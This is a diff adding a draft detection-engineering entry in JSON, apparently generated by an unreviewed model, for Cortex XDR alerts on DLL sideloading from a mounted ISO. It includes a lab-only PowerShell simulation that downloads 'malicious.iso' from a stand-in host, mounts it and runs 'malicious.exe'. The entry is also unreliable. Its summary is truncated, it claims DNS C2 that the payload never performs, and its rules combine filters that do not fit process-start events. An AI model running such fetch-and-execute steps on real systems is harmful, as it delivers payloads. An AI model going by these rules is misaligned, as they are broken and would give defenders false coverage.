@@ -1,0 +1,198 @@
+{
+  "id": "TTP-0000-0245",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "DLL Sideloading from ISO via PowerShell",
+    "summary": "An attacker uses PowerShell to load a malicious DLL from a mounted ISO image, triggering Cortex's detection for uncommon DLL sideloading from CD-ROM devices. The attack involves mounting an ISO, execu",
+    "description": "An attacker uses PowerShell to load a malicious DLL from a mounted ISO image, triggering Cortex's detection for uncommon DLL sideloading from CD-ROM devices. The attack involves mounting an ISO, executing a benign-looking process that loads a malicious DLL, and establishing C2 communication."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1574",
+        "subtechnique_id": "T1574.002",
+        "name": "Hijack Execution Flow: DLL Side-Loading",
+        "tactic_ids": [
+          "TA0004",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Privilege Escalation",
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir C:\\temp\\iso\nwget https://example.com/malicious.iso -O C:\\temp\\iso\\malicious.iso\nMount-DiskImage -ImagePath C:\\temp\\iso\\malicious.iso\n$drive = Get-DiskImage -ImagePath C:\\temp\\iso\\malicious.iso | Get-Volume\n$exePath = \"$($drive.DriveLetter):\\malicious.exe\"\nStart-Process -FilePath $exePath -ArgumentList \"-c 'C:\\temp\\iso\\malicious.dll'\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process starting from ISO drive",
+        "expected_value": "action_process_image_name contains '\\malicious.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Malicious DLL loaded from ISO",
+        "expected_value": "action_file_path contains 'malicious.dll'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "C2 communication to TEST-NET-1",
+        "expected_value": "dst_ip in [192.0.2.0/24]"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon DLL Sideloading from ISO",
+        "description": "Detects when a process loads a DLL from a logical CD-ROM or ISO device not typically used for such operations",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name contains '\\malicious.exe'\n| filter action_file_path contains 'malicious.dll'\n| filter action_remote_ip in [192.0.2.0/24]\n| filter actor_process_image_name contains 'powershell.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1574.002",
+          "T1071.004"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious DLL Load from Mounted ISO",
+        "description": "Behavioral deviation where a process loads a DLL from a mounted ISO drive, which is not typical for legitimate software",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name contains '\\malicious.exe'\n| filter action_file_path contains 'malicious.dll'\n| filter action_remote_ip in [192.0.2.0/24]\n| filter actor_process_image_name contains 'powershell.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "powershell.exe loading DLL from mounted ISO",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1574.002",
+          "T1071.004"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Hunt for DLL Sideloading from ISO",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name contains '\\malicious.exe'\n| filter action_file_path contains 'malicious.dll'\n| filter action_remote_ip in [192.0.2.0/24]\n| filter actor_process_image_name contains 'powershell.exe'\n| comp count() by actor_process_image_name, action_file_path",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Uncommon DLL-sideloading from a logical CD-ROM (ISO) device; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-dll-sideloading-from-a-logical-cd-rom-iso-device"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Uncommon DLL-sideloading from a logical CD-ROM (ISO) device",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-dll-sideloading-from-a-logical-cd-rom-iso-device",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1574.002",
+      "url": "https://attack.mitre.org/techniques/T1574/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071.004",
+      "url": "https://attack.mitre.org/techniques/T1071/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
